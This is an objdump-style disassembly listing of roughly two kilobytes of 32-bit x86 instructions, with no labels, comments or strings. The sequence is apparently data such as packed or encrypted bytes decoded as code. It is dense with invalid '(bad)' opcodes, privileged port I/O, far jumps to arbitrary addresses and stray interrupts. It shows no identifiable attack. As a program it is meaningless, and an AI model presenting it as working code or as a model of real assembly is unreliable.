  40d510:	sbb    DWORD PTR [ecx-0x7cbe495f],0x22663003
  40d51a:	xchg   esp,eax
  40d51b:	retf   0x1723
  40d51e:	lods   al,BYTE PTR ds:[esi]
  40d51f:	das    
  40d520:	dec    esp
  40d521:	std    
  40d522:	or     al,0x95
  40d524:	pop    esi
  40d525:	mov    ds:0x71a06e11,al
  40d52a:	ret    
  40d52b:	xchg   ebx,esi
  40d52d:	sti    
  40d52e:	adc    DWORD PTR [esi+ebp*2+0x56],ebp
  40d532:	fild   WORD PTR [edi-0x32ca762c]
  40d538:	xor    cl,bh
  40d53a:	fsubr  DWORD PTR [ebp+0x398812c]
  40d540:	push   cs
  40d541:	(bad)  
  40d542:	call   0x105f:0xca64b625
  40d549:	dec    edx
  40d54a:	inc    edx
  40d54b:	jle    0x40d4e3
  40d54d:	push   ss
  40d54e:	enter  0xcdb,0xd6
  40d552:	dec    esp
  40d553:	dec    ebx
  40d554:	into   
  40d555:	pop    eax
  40d556:	dec    edx
  40d557:	push   es
  40d558:	xor    eax,0xe155ec57
  40d55d:	fwait
  40d55e:	dec    edi
  40d55f:	mov    WORD PTR [edi],cs
  40d561:	aas    
  40d562:	or     al,0x8c
  40d564:	sbb    ch,BYTE PTR [ecx]
  40d566:	cmp    dh,ah
  40d568:	xchg   ecx,eax
  40d569:	lea    eax,ss:[ebp+0x1b]
  40d56d:	call   0x85be9d16
  40d572:	mov    ecx,0xabdd81d0
  40d577:	sbb    eax,0xfffffffc
  40d57a:	jnp    0x40d50b
  40d57c:	nop
  40d57d:	xchg   esi,eax
  40d57e:	push   ecx
  40d57f:	stc    
  40d580:	adc    BYTE PTR [edx-0x51],cl
  40d583:	pop    edx
  40d584:	jge    0x40d5af
  40d586:	dec    edx
  40d587:	call   0xdb51408c
  40d58c:	sbb    bl,al
  40d58e:	lods   eax,DWORD PTR ds:[esi]
  40d58f:	fdiv   DWORD PTR [ebx+0x7b]
  40d592:	pop    eax
  40d593:	push   esi
  40d594:	jno    0x40d51a
  40d596:	sub    ebp,edi
  40d598:	bound  esp,QWORD PTR [edi-0x63]
  40d59b:	daa    
  40d59c:	and    DWORD PTR [edi-0x33b03096],ebp
  40d5a2:	jmp    FWORD PTR [eax+0x7af89acd]
  40d5a8:	jns    0x40d5c8
  40d5aa:	xchg   edi,eax
  40d5ab:	add    dh,BYTE PTR [edi]
  40d5ad:	sub    edi,DWORD PTR [eax+0x3e]
  40d5b0:	add    al,0xcc
  40d5b2:	xchg   edi,eax
  40d5b3:	(bad)
  40d5b7:	daa    
  40d5b8:	ins    BYTE PTR es:[edi],dx
  40d5b9:	xor    eax,0x1c8c6146
  40d5be:	aaa    
  40d5bf:	inc    edi
  40d5c0:	xchg   edi,eax
  40d5c1:	mov    eax,ds:0x709de508
  40d5c7:	push   eax
  40d5c8:	xchg   esp,eax
  40d5c9:	pop    ebp
  40d5ca:	xor    ah,cl
  40d5cc:	jbe    0x40d5e4
  40d5ce:	out    dx,eax
  40d5cf:	(bad)
  40d5d2:	sbb    dl,al
  40d5d4:	repz push ds
  40d5d6:	inc    ebx
  40d5d7:	sbb    eax,0x4eb302c7
  40d5dc:	inc    edx
  40d5dd:	neg    BYTE PTR [esi]
  40d5df:	adc    ecx,DWORD PTR gs:[eax+0x89e093e]
  40d5e6:	ss inc edx
  40d5e8:	jno    0x40d63a
  40d5ea:	dec    ebp
  40d5eb:	sub    ah,bl
  40d5ed:	jb     0x40d586
  40d5ef:	or     al,0x64
  40d5f1:	push   0xebbb636d
  40d5f6:	push   cs
  40d5f7:	sbb    edx,DWORD PTR [eax]
  40d5f9:	and    ah,0xc2
  40d5fc:	shl    ecx,0x76
  40d5ff:	inc    edi
  40d600:	adc    eax,0xadfb52a4
  40d605:	push   cs
  40d606:	nop
  40d607:	xor    DWORD PTR [edi+ecx*2+0x4ed1b28e],edi
  40d60e:	adc    eax,edi
  40d610:	jmp    0x40d5fe
  40d612:	call   0xcb21:0xfe89bc8b
  40d619:	jns    0x40d631
  40d61b:	call   0x23e4:0xac5af5f7
  40d622:	imul   esp,ebx,0x7e
  40d625:	out    0x7a,eax
  40d627:	xor    eax,0x30e398bf
  40d62c:	leave  
  40d62d:	ds js  0x40d6a2
  40d630:	xchg   ebp,eax
  40d631:	je     0x40d637
  40d633:	push   ebx
  40d634:	push   ds
  40d635:	jl     0x40d680
  40d637:	jl     0x40d5bf
  40d639:	cmc    
  40d63a:	push   ebx
  40d63b:	out    dx,al
  40d63c:	mov    al,0x18
  40d63e:	push   cs
  40d63f:	add    BYTE PTR ds:0xbe285b18,ah
  40d645:	sub    eax,0x462b4ea9
  40d64a:	sub    BYTE PTR [ebp-0x64],0x9b
  40d64e:	nop
  40d64f:	ins    DWORD PTR es:[edi],dx
  40d650:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d652:	mov    ch,0x88
  40d654:	aam    0xe0
  40d656:	fs cli 
  40d658:	imul   esi,DWORD PTR [edi],0xfffffff5
  40d65b:	ins    DWORD PTR es:[di],dx
  40d65d:	mov    bh,0x78
  40d65f:	dec    DWORD PTR [esi+0x7dd93190]
  40d665:	ss inc ebp
  40d667:	push   0xf443112c
  40d66c:	mov    al,0xaf
  40d66e:	shr    DWORD PTR [ebx],cl
  40d670:	sbb    eax,DWORD PTR [edx]
  40d672:	jno    0x40d6ad
  40d674:	cmp    BYTE PTR [ebx],dh
  40d676:	or     cl,BYTE PTR [edx-0x7a]
  40d679:	pop    esp
  40d67a:	mov    ebx,0x77c747b7
  40d67f:	fadd   st,st(5)
  40d681:	leave  
  40d682:	(bad)  
  40d683:	or     eax,0x31edcc60
  40d688:	in     al,dx
  40d689:	push   ebp
  40d68a:	ret    0xa348
  40d68d:	(bad)  
  40d68e:	jg     0x40d6dd
  40d690:	(bad)  
  40d691:	data16 (bad) 
  40d693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d694:	and    al,0xa7
  40d696:	ds jmp 0x40d649
  40d699:	sahf   
  40d69a:	pop    ds
  40d69b:	in     eax,0xa6
  40d69d:	sbb    edi,DWORD PTR [edx-0x77]
  40d6a0:	stc    
  40d6a1:	mov    edx,0x68c29c90
  40d6a6:	dec    esp
  40d6a7:	iret   
  40d6a8:	in     eax,dx
  40d6a9:	xchg   ebx,eax
  40d6aa:	push   ss
  40d6ab:	pop    esp
  40d6ac:	mov    al,ds:0x907cf026
  40d6b1:	lds    ebx,FWORD PTR [ebp-0x4c9143fe]
  40d6b7:	push   ecx
  40d6b8:	jae    0x40d65d
  40d6ba:	in     eax,dx
  40d6bb:	and    al,0x2c
  40d6bd:	ins    DWORD PTR es:[edi],dx
  40d6be:	push   cs
  40d6bf:	xor    BYTE PTR [ebx+0x440e8b94],bl
  40d6c5:	cwde   
  40d6c6:	loopne 0x40d720
  40d6c8:	(bad)  
  40d6ca:	cmp    DWORD PTR [edi],ebp
  40d6cc:	ret    
  40d6cd:	add    BYTE PTR [ecx-0x1e],0x9c
  40d6d1:	xchg   esi,eax
  40d6d2:	xchg   ebp,eax
  40d6d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6d4:	ins    DWORD PTR es:[edi],dx
  40d6d5:	jecxz  0x40d73a
  40d6d7:	pop    ebp
  40d6d8:	rcl    ebp,cl
  40d6da:	adc    DWORD PTR [ebp-0x1b],ebx
  40d6dd:	add    al,0xa3
  40d6df:	stos   DWORD PTR es:[edi],eax
  40d6e0:	inc    ecx
  40d6e1:	pusha  
  40d6e2:	pushf  
  40d6e3:	jg     0x40d734
  40d6e5:	out    0xbd,eax
  40d6e7:	(bad)  
  40d6e8:	or     eax,DWORD PTR [ebp-0x57]
  40d6eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6ec:	out    dx,al
  40d6ed:	ja     0x40d73e
  40d6ef:	loop   0x40d75c
  40d6f1:	rol    DWORD PTR ds:0x8b075d23,0x10
  40d6f8:	xchg   esi,eax
  40d6f9:	inc    edi
  40d6fa:	bound  esi,QWORD PTR [ebx+0x3f]
  40d6fd:	cli    
  40d6fe:	jmp    0xa0900dab
  40d703:	imul   edx,ecx,0x18
  40d706:	scas   eax,DWORD PTR es:[edi]
  40d707:	pusha  
  40d708:	pop    es
  40d709:	pop    ecx
  40d70a:	int    0xff
  40d70c:	push   ecx
  40d70d:	push   ebx
  40d70e:	xlat   BYTE PTR ds:[ebx]
  40d70f:	xor    eax,DWORD PTR [esi+ecx*8]
  40d712:	mov    eax,ds:0xbb533c51
  40d717:	cwde   
  40d718:	sub    esp,0xdd54441
  40d71e:	dec    edi
  40d71f:	lds    ecx,FWORD PTR [ebp-0x12]
  40d722:	out    0xad,al
  40d724:	fild   DWORD PTR [edi-0x48ba4e7f]
  40d72a:	and    dh,BYTE PTR [ecx]
  40d72c:	mov    edx,0x48507f1c
  40d731:	xor    eax,DWORD PTR [edi+0x3b24246]
  40d737:	and    esp,DWORD PTR [edx]
  40d739:	cmc    
  40d73a:	int    0xf5
  40d73c:	push   cs
  40d73d:	sahf   
  40d73e:	pop    ebp
  40d740:	cmp    DWORD PTR [ebp-0x341bb6a2],ebp
  40d746:	cmc    
  40d747:	sar    DWORD PTR [eax+0x5d],0x88
  40d74b:	outs   dx,DWORD PTR ds:[esi]
  40d74c:	pushf  
  40d74d:	mov    esp,DWORD PTR [ebx]
  40d74f:	lods   al,BYTE PTR ds:[esi]
  40d750:	leave  
  40d751:	(bad)  
  40d752:	and    al,0x9a
  40d754:	(bad)  
  40d755:	aam    0x4a
  40d757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d758:	dec    edx
  40d759:	cmp    al,0xc3
  40d75b:	rcr    BYTE PTR [ebx+0x78ca9af8],0xaa
  40d762:	xchg   esp,eax
  40d763:	or     eax,0x23b5cbe3
  40d768:	std    
  40d769:	loope  0x40d730
  40d76b:	jo     0x40d783
  40d76d:	hlt    
  40d76e:	mov    edx,0x9ad563e1
  40d773:	xchg   ebp,eax
  40d774:	mov    edx,0x9d75997a
  40d779:	push   edx
  40d77a:	push   edx
  40d77b:	push   cs
  40d77c:	ret    
  40d77d:	aas    
  40d77e:	or     al,0x73
  40d780:	test   BYTE PTR [esi-0x5d],ah
  40d783:	push   cs
  40d784:	cmp    ah,ah
  40d786:	jns    0x40d710
  40d788:	mov    ds:0x8d8af30c,eax
  40d78d:	jns    0x40d73e
  40d78f:	ror    BYTE PTR [ecx+0x44440d4d],cl
  40d795:	std    
  40d796:	outs   dx,BYTE PTR ds:[esi]
  40d797:	jge    0x40d781
  40d799:	add    eax,0xa685db57
  40d79e:	xchg   esi,eax
  40d79f:	add    edx,DWORD PTR [edx+0x2c8f5901]
  40d7a5:	cs xor al,0x7c
  40d7a8:	cmp    DWORD PTR [ebx],esi
  40d7aa:	and    cl,BYTE PTR [edi+eiz*8-0x35]
  40d7ae:	(bad)  
  40d7af:	stc    
  40d7b0:	jo     0x40d829
  40d7b2:	xchg   esp,eax
  40d7b3:	popa   
  40d7b4:	sbb    al,0x10
  40d7b6:	hlt    
  40d7b7:	fwait
  40d7b8:	in     eax,0xc4
  40d7ba:	ficom  DWORD PTR [ebp-0x5efb59d1]
  40d7c0:	push   ss
  40d7c1:	and    edx,DWORD PTR [ecx+0x1daf99f8]
  40d7c7:	rol    DWORD PTR [esi+0x4db73a56],cl
  40d7cd:	shl    BYTE PTR [esi+0x2d01bb11],1
  40d7d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7d4:	mov    DWORD PTR [ebp-0x7d155352],eax
  40d7da:	or     al,BYTE PTR [ecx+0x5d51abdd]
  40d7e0:	les    ebx,FWORD PTR [edx-0x2e]
  40d7e3:	push   edi
  40d7e4:	in     al,dx
  40d7e5:	or     BYTE PTR ss:[ecx-0x24],ah
  40d7e9:	adc    eax,0xfd57278
  40d7ee:	adc    BYTE PTR [ebp-0x22],0xb3
  40d7f2:	dec    ecx
  40d7f3:	jge    0x40d802
  40d7f5:	add    edi,DWORD PTR ds:0x7404cf1e
  40d7fb:	mov    al,0x39
  40d7fd:	imul   esi,ebp,0x9a674370
  40d803:	xchg   ebp,eax
  40d804:	add    esi,eax
  40d806:	mov    eax,ds:0x65552cb7
  40d80b:	dec    edi
  40d80c:	imul   eax,ebx,0x5f
  40d80f:	lods   eax,DWORD PTR ds:[esi]
  40d810:	loop   0x40d7d8
  40d812:	test   eax,0xfd6f591a
  40d817:	clc    
  40d818:	adc    eax,0x88233b92
  40d81d:	or     ah,BYTE PTR [ecx-0x5f]
  40d820:	out    0xcd,al
  40d822:	xor    BYTE PTR [ebp+0x18e62438],al
  40d828:	push   ds
  40d829:	out    dx,al
  40d82a:	jl     0x40d7bb
  40d82c:	ret    
  40d82d:	adc    bl,BYTE PTR [ecx-0x5626882b]
  40d833:	clc    
  40d834:	test   DWORD PTR [ebp+ebp*4+0x39],edi
  40d838:	enter  0x67bd,0xea
  40d83c:	sbb    BYTE PTR [ebx-0x15],ch
  40d83f:	mov    al,BYTE PTR [esi]
  40d841:	inc    esp
  40d842:	mov    eax,ds:0xf0808ddc
  40d847:	sbb    eax,0x6974fc70
  40d84c:	cs push esp
  40d84e:	add    edi,DWORD PTR [ebx+0x62c016b7]
  40d854:	xor    edx,esp
  40d856:	fstp   TBYTE PTR [ebx]
  40d858:	sbb    al,0x1
  40d85a:	(bad)  
  40d85c:	popa   
  40d85d:	test   al,0x5b
  40d85f:	mov    ah,0xdd
  40d861:	mov    ecx,0x71383076
  40d866:	xchg   esi,eax
  40d867:	(bad)  
  40d868:	mov    ds:0xc9589d20,eax
  40d86d:	adc    BYTE PTR [edx+0x27],al
  40d870:	cmp    eax,0x688003cd
  40d875:	stos   DWORD PTR es:[edi],eax
  40d876:	mov    ebp,0xebb3c117
  40d87b:	popa   
  40d87c:	mov    dl,0x82
  40d87e:	cmp    eax,0x4ae01fb2
  40d883:	pop    ds
  40d884:	sar    esi,cl
  40d886:	xor    cl,BYTE PTR [edx+0x6]
  40d889:	ret    
  40d88a:	fmulp  st(5),st
  40d88c:	push   cs
  40d88d:	out    0xd9,al
  40d88f:	lds    ecx,FWORD PTR [eax+0x3]
  40d892:	xlat   BYTE PTR ds:[ebx]
  40d893:	popa   
  40d894:	mov    bl,0x4b
  40d896:	mov    dl,0x2f
  40d898:	int    0x70
  40d89a:	in     eax,dx
  40d89b:	(bad)  
  40d89c:	jne    0x40d8f3
  40d89e:	stos   BYTE PTR es:[edi],al
  40d89f:	idiv   WORD PTR [edi]
  40d8a2:	sbb    al,0x87
  40d8a4:	(bad)
  40d8a7:	sub    BYTE PTR [esp+edi*8],0x97
  40d8ab:	or     BYTE PTR es:[ecx-0x50],ah
  40d8af:	popa   
  40d8b0:	and    bl,dh
  40d8b2:	stos   BYTE PTR es:[edi],al
  40d8b3:	jb     0x40d85e
  40d8b5:	in     eax,0x93
  40d8b7:	mov    ecx,0xd1fc31aa
  40d8bc:	or     ecx,0xde8e9cdd
  40d8c2:	mov    ah,0x44
  40d8c4:	xor    esp,DWORD PTR [edx-0x6f]
  40d8c7:	test   eax,0x1ab6d948
  40d8cc:	mov    al,BYTE PTR [ecx]
  40d8ce:	xchg   esp,eax
  40d8cf:	or     eax,0x2f0d8703
  40d8d4:	jne    0x40d873
  40d8d6:	ffree  st(3)
  40d8d8:	icebp  
  40d8d9:	or     esp,DWORD PTR [ebx+0x55]
  40d8dc:	push   0x5c
  40d8de:	mov    bl,BYTE PTR [edx-0x3f]
  40d8e1:	aaa    
  40d8e2:	mov    esi,0x2d40287a
  40d8e7:	comiss xmm0,DWORD PTR [edi-0x1935fcd3]
  40d8ee:	adc    edi,DWORD PTR [edx]
  40d8f0:	cmp    esp,DWORD PTR [esi-0x20]
  40d8f3:	adc    dh,BYTE PTR [eax-0x64]
  40d8f6:	fmul   QWORD PTR [ecx+0x6c]
  40d8f9:	arpl   WORD PTR [esi+0x3b],ax
  40d8fc:	mov    ds:0x8f4863e7,al
  40d901:	add    al,0x56
  40d903:	sub    al,0xcd
  40d905:	push   esi
  40d906:	adc    DWORD PTR [edx],esp
  40d908:	leave  
  40d909:	aaa    
  40d90a:	out    0xaa,eax
  40d90c:	mov    dl,0x1c
  40d90e:	or     BYTE PTR [edx],ah
  40d910:	pushf  
  40d911:	pop    esp
  40d912:	aam    0x62
  40d914:	in     eax,dx
  40d915:	fnsave [ebp+0x3e93003b]
  40d91b:	jne    0x40d8da
  40d91d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d91e:	les    edi,FWORD PTR [esi-0x7e8c4fb4]
  40d924:	push   edx
  40d925:	ins    DWORD PTR es:[edi],dx
  40d926:	ror    DWORD PTR [ebx+0x61],0xd0
  40d92a:	mov    edx,DWORD PTR [esi]
  40d92c:	aas    
  40d92d:	leave  
  40d92e:	pop    ds
  40d92f:	out    0xf7,al
  40d931:	push   esi
  40d932:	pop    eax
  40d933:	cmp    BYTE PTR [esi],dl
  40d935:	dec    eax
  40d936:	imul   DWORD PTR [ecx]
  40d938:	nop
  40d939:	mov    esi,0x8d2cecec
  40d93e:	lea    ecx,[ebp+0x65]
  40d941:	add    eax,0xb35d6dc5
  40d946:	lea    edx,[ebx]
  40d948:	push   edx
  40d949:	in     al,dx
  40d94a:	repz mov bl,0x69
  40d94d:	cwde   
  40d94e:	ficomp DWORD PTR [ecx+ecx*1-0xfebc2f1]
  40d955:	loopne 0x40d999
  40d957:	out    dx,eax
  40d958:	iret   
  40d959:	aam    0xe4
  40d95b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d95c:	cli    
  40d95d:	sti    
  40d95e:	mov    ch,BYTE PTR ds:0x97def6c7
  40d964:	scas   al,BYTE PTR es:[edi]
  40d965:	inc    ebp
  40d966:	pop    ds
  40d967:	mov    ?,WORD PTR [edx+0x7eea42a0]
  40d96d:	and    esi,edi
  40d96f:	jecxz  0x40d96b
  40d971:	imul   esi,DWORD PTR [edi+0x7516cb72],0xffffffbb
  40d978:	or     al,0x13
  40d97a:	inc    edx
  40d97b:	or     DWORD PTR [ecx-0x6f],0xffffffba
  40d97f:	nop
  40d980:	dec    edx
  40d981:	shl    ch,0x30
  40d984:	fst    DWORD PTR [esi+0x43d644e5]
  40d98a:	jmp    0x40d980
  40d98c:	or     esp,DWORD PTR [ebp-0x7f8a646]
  40d992:	int    0x2
  40d994:	or     al,0x4e
  40d996:	xor    dh,BYTE PTR [ebp-0x7bef99a3]
  40d99c:	mov    ebp,0xd4e47a44
  40d9a1:	dec    esi
  40d9a2:	push   DWORD PTR [edx-0x48]
  40d9a5:	pop    edx
  40d9a6:	adc    esp,DWORD PTR [esi]
  40d9a8:	out    dx,eax
  40d9a9:	xor    al,0x8f
  40d9ab:	xor    ecx,DWORD PTR [edx+0x1c]
  40d9ae:	test   DWORD PTR [ecx+0x13],esi
  40d9b1:	pop    esi
  40d9b2:	or     esp,DWORD PTR [ebp+esi*1+0x23]
  40d9b6:	repnz test BYTE PTR [eax-0x5a],dl
  40d9ba:	push   ds
  40d9bb:	loopne 0x40d9f7
  40d9bd:	cmc    
  40d9be:	call   0xe705aeab
  40d9c3:	jne    0x40d9b7
  40d9c5:	push   ss
  40d9c6:	jmp    0xb9e8:0x4655bd80
  40d9cd:	pop    ss
  40d9ce:	clc    
  40d9cf:	sub    BYTE PTR [eax+0x33],0xcf
  40d9d3:	retf   
  40d9d4:	nop
  40d9d5:	cld    
  40d9d6:	ret    0xfc4d
  40d9d9:	jnp    0x40d9b7
  40d9db:	push   ds
  40d9dc:	iret   
  40d9dd:	retf   
  40d9de:	jne    0x40da15
  40d9e0:	cmp    ecx,DWORD PTR [ebp+0x71]
  40d9e3:	adc    al,0x9c
  40d9e5:	imul   ebp,edx,0xb9429fa2
  40d9eb:	retf   
  40d9ec:	fwait
  40d9ed:	dec    edi
  40d9ee:	xchg   BYTE PTR [eax-0x1c],ah
  40d9f1:	xchg   esp,eax
  40d9f2:	mov    DWORD PTR [esi],edx
  40d9f4:	push   esi
  40d9f5:	cmp    DWORD PTR [esi+edi*2],0xb4b0464f
  40d9fc:	mov    ecx,0xf229418b
  40da01:	daa    
  40da02:	and    eax,DWORD PTR [eax]
  40da04:	fmul   QWORD PTR [esi]
  40da06:	mov    ch,dl
  40da08:	jmp    0x40da26
  40da0a:	ret    
  40da0b:	retf   0x21e6
  40da0e:	sti    
  40da0f:	out    dx,eax
  40da10:	xchg   DWORD PTR [ecx+0x1e970ac7],esp
  40da16:	test   eax,0x46efd4e
  40da1b:	data16 mov bl,BYTE PTR [ebx]
  40da1e:	xor    esi,DWORD PTR [ebx]
  40da20:	push   esp
  40da21:	retf   
  40da22:	test   al,0xf6
  40da24:	xchg   edi,eax
  40da25:	aad    0x29
  40da27:	or     al,0xb6
  40da29:	mov    cl,0xd0
  40da2c:	(bad)  
  40da2d:	stc    
  40da2e:	je     0x40d9e4
  40da30:	stos   DWORD PTR es:[edi],eax
  40da31:	sub    eax,0x61091b9a
  40da36:	arpl   WORD PTR [ecx-0x65],ax
  40da39:	jmp    0x40d9f6
  40da3b:	pop    ebp
  40da3c:	xchg   edx,eax
  40da3d:	jecxz  0x40dabd
  40da3f:	sub    al,0xe0
  40da41:	in     al,dx
  40da42:	push   esi
  40da43:	sar    BYTE PTR [edx],0x88
  40da46:	enter  0xceb5,0xcb
  40da4a:	pop    ss
  40da4b:	ins    DWORD PTR es:[edi],dx
  40da4c:	outs   dx,BYTE PTR ds:[esi]
  40da4d:	pop    edx
  40da4e:	aas    
  40da4f:	aas    
  40da50:	test   al,0x6a
  40da52:	rcl    DWORD PTR [edi],cl
  40da54:	xchg   esp,eax
  40da55:	mov    edi,0xe0d5c247
  40da5a:	mov    ds:0xddc59df0,al
  40da5f:	stos   BYTE PTR es:[edi],al
  40da60:	test   al,0x91
  40da62:	jmp    FWORD PTR [edx+ebp*1+0x76]
  40da66:	fs aad 0x4a
  40da69:	push   cs
  40da6a:	arpl   WORD PTR [esi],bp
  40da6c:	(bad)  
  40da6d:	jmp    0x40dab7
  40da6f:	sbb    ebx,eax
  40da71:	mov    dl,0x8f
  40da73:	dec    eax
  40da74:	sahf   
  40da75:	jbe    0x40da62
  40da77:	out    0xb8,al
  40da79:	test   edx,eax
  40da7b:	dec    ebx
  40da7c:	call   0xc413b31a
  40da81:	ss jno 0x40da77
  40da84:	mov    ah,0x2e
  40da86:	push   es
  40da87:	dec    ebx
  40da88:	imul   eax,DWORD PTR ss:[edx+eax*1-0x30],0xf77e1e39
  40da91:	xchg   BYTE PTR [ebx-0x76],dh
  40da94:	out    dx,al
  40da95:	mov    ch,0x71
  40da97:	mov    eax,0xa9548df0
  40da9c:	es push ecx
  40da9e:	mov    ebx,0x5c9ea51a
  40daa3:	jmp    0xba63:0x8c5cc0b6
  40daaa:	push   ds
  40daab:	adc    al,0x28
  40daad:	loop   0x40da94
  40daaf:	pop    ecx
  40dab0:	std    
  40dab1:	loop   0x40dac2
  40dab3:	inc    esi
  40dab4:	gs shl edi,1
  40dab7:	push   ebx
  40dab8:	fadd   DWORD PTR [ebx-0x60]
  40dabb:	imul   ebp,DWORD PTR [edx+0x2d6b9080],0xbd79ffb7
  40dac5:	xchg   BYTE PTR [esi+0x5b6853e4],ah
  40dacb:	or     dl,ah
  40dacd:	aaa    
  40dace:	adc    BYTE PTR [ebp+0x18],ch
  40dad1:	add    DWORD PTR [edx+0x8],edx
  40dad4:	mov    esi,0x1d2d0ec1
  40dad9:	mov    al,ds:0x80e9a466
  40dade:	xor    eax,0x117d0b1
  40dae3:	xor    al,0x43
  40dae5:	je     0x40db32
  40dae7:	inc    edx
  40dae8:	and    BYTE PTR [ecx+0x21],cl
  40daeb:	clc    
  40daec:	push   ecx
  40daed:	jno    0x40daec
  40daef:	xlat   BYTE PTR ds:[ebx]
  40daf0:	sub    DWORD PTR [ebx],esp
  40daf2:	sbb    DWORD PTR [ebx+esi*4],ebp
  40daf5:	jb     0x40dae6
  40daf7:	or     DWORD PTR [eax-0x40],esp
  40dafa:	div    DWORD PTR [eax-0x1c]
  40dafd:	add    al,0xb6
  40daff:	lds    esi,FWORD PTR [eax]
  40db01:	out    0xaf,al
  40db03:	outs   dx,DWORD PTR ds:[esi]
  40db04:	out    dx,al
  40db05:	ror    DWORD PTR [edx+0x72],0x22
  40db09:	fisttp DWORD PTR fs:[eax]
  40db0c:	(bad)  
  40db0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db0e:	xor    esi,DWORD PTR [ecx]
  40db10:	sbb    BYTE PTR [ebp-0x508db218],bh
  40db16:	stos   BYTE PTR es:[edi],al
  40db17:	daa    
  40db18:	pop    esi
  40db19:	test   al,0xad
  40db1b:	call   0xa6c28ee4
  40db20:	sub    ch,BYTE PTR [eax-0x3bb95f5a]
  40db26:	ret    0x3c4a
  40db29:	jb     0x40db26
  40db2b:	and    bh,BYTE PTR [esi]
  40db2d:	ins    DWORD PTR es:[edi],dx
  40db2e:	jp     0x40dafe
  40db30:	imul   edx,DWORD PTR [ebp+0x32569bba],0xffffffe5
  40db37:	lods   al,BYTE PTR ds:[esi]
  40db38:	jnp    0x40db16
  40db3a:	cwde   
  40db3b:	aam    0x34
  40db3d:	sub    al,0x8e
  40db3f:	xchg   ecx,eax
  40db40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db41:	aam    0xf5
  40db43:	ss jo  0x40db31
  40db46:	shr    BYTE PTR [eax],0x64
  40db49:	lods   eax,DWORD PTR ds:[esi]
  40db4a:	or     BYTE PTR [edi+0x5d498cc],0x94
  40db51:	stos   DWORD PTR es:[edi],eax
  40db52:	push   0x6d2a08ce
  40db57:	pop    esi
  40db58:	mov    dl,0x85
  40db5a:	inc    edx
  40db5b:	or     eax,0x9f444d21
  40db60:	push   ecx
  40db61:	std    
  40db62:	in     al,dx
  40db63:	mov    ds:0x87688c9a,al
  40db68:	mov    eax,ds:0x836c32e5
  40db6d:	xchg   edi,eax
  40db6e:	pusha  
  40db6f:	std    
  40db70:	jp     0x40dbca
  40db72:	jae    0x40db96
  40db74:	or     cl,al
  40db76:	xchg   ecx,eax
  40db77:	scas   al,BYTE PTR es:[edi]
  40db78:	scas   al,BYTE PTR es:[edi]
  40db79:	adc    ebx,ebp
  40db7b:	hlt    
  40db7c:	dec    ebx
  40db7d:	test   al,0x6e
  40db7f:	dec    edi
  40db80:	and    eax,0xdb1ed551
  40db85:	jno    0x40db3b
  40db87:	scas   eax,DWORD PTR es:[edi]
  40db88:	xchg   ecx,eax
  40db89:	ja     0x40db8d
  40db8b:	adc    ah,al
  40db8d:	mov    dl,0x2f
  40db8f:	xor    al,0xd9
  40db91:	push   ss
  40db92:	adc    al,0x6d
  40db94:	inc    eax
  40db95:	adc    eax,0x7cc12157
  40db9a:	sar    ah,0xfa
  40db9d:	(bad)  [edi+0x2d]
  40dba0:	and    BYTE PTR [ebx],al
  40dba2:	jmp    0x40db26
  40dba4:	push   edi
  40dba5:	add    DWORD PTR [ecx+0x23],0xffffff8f
  40dba9:	retf   
  40dbaa:	loope  0x40dbbf
  40dbac:	mov    ah,0xe8
  40dbae:	ss aas 
  40dbb0:	stos   BYTE PTR es:[edi],al
  40dbb1:	stos   DWORD PTR es:[edi],eax
  40dbb2:	pushf  
  40dbb3:	cmp    al,BYTE PTR [edi]
  40dbb5:	jecxz  0x40dbf9
  40dbb7:	mov    DWORD PTR [eax],0xb55e98f2
  40dbbd:	daa    
  40dbbe:	into   
  40dbbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbc0:	mov    esi,DWORD PTR [edx+0x74]
  40dbc3:	jae    0x40dc12
  40dbc5:	ins    DWORD PTR es:[edi],dx
  40dbc6:	cli    
  40dbc7:	out    0x27,al
  40dbc9:	imul   edx,DWORD PTR [ecx+edi*2-0x608a1c4f],0xffffffd7
  40dbd1:	sub    eax,esi
  40dbd3:	dec    edi
  40dbd4:	push   es
  40dbd5:	leave  
  40dbd6:	popf   
  40dbd7:	cmp    dh,cl
  40dbd9:	jle    0x40dc5a
  40dbdb:	jg     0x40dc5c
  40dbdd:	mov    al,0x9
  40dbdf:	xchg   esi,ecx
  40dbe1:	pop    ds
  40dbe2:	jae    0x40dc41
  40dbe4:	addr16 ja 0x40dc0b
  40dbe7:	xor    al,0x1b
  40dbe9:	dec    edi
  40dbea:	stos   DWORD PTR es:[edi],eax
  40dbeb:	pop    esp
  40dbec:	push   ds
  40dbed:	mov    ecx,0xc392b7b6
  40dbf2:	add    BYTE PTR [ebp+ebp*1+0x1a],bh
  40dbf6:	mov    bh,0x48
  40dbf8:	cmc    
  40dbf9:	arpl   WORD PTR [ebx-0x57],si
  40dbfc:	imul   edi,edi,0x3c
  40dbff:	ins    DWORD PTR es:[edi],dx
  40dc00:	sub    eax,0xf6ce1207
  40dc05:	inc    esi
  40dc06:	push   fs
  40dc08:	xchg   DWORD PTR [esp+ebx*2-0x31],esi
  40dc0c:	xchg   ecx,eax
  40dc0d:	push   ebp
  40dc0e:	or     al,0xdd
  40dc10:	stos   DWORD PTR es:[edi],eax
  40dc11:	aaa    
  40dc12:	xor    eax,0x8f258c5d
  40dc17:	fnstcw WORD PTR ds:0x90001e12
  40dc1d:	nop
  40dc1e:	mul    dl
  40dc20:	mul    BYTE PTR [edi]
  40dc22:	cmc    
  40dc23:	mov    ds:0xa80a860c,eax
  40dc28:	outs   dx,BYTE PTR ds:[esi]
  40dc29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc2a:	fwait
  40dc2b:	jnp    0x40dbd6
  40dc2d:	add    edx,DWORD PTR [ebp+0x770845b6]
  40dc33:	je     0x40dc9e
  40dc35:	outs   dx,DWORD PTR ds:[esi]
  40dc36:	push   cs
